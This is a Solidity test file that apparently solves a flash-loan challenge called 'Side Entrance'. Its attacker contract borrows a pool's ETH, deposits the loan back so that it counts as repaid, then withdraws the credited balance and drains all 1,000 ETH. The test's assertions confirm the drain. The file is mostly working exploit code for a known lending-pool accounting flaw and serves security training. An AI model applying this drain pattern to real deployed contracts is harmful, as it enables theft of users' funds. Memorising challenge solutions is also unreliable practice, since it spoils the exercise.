// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../Contracts/side-entrance/SideEntranceLenderPool.sol";

contract AttackerContract is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    receive() external payable {}

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(msg.sender).call{value: amount}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}

contract SideEntrance is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // The pool is vulnerable because the attacker is able to deposit borrowed ETH
        vm.startPrank(attacker);

        AttackerContract attackerContract = new AttackerContract(
            sideEntranceLenderPool
        );
        attackerContract.attack(ETHER_IN_POOL);

        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
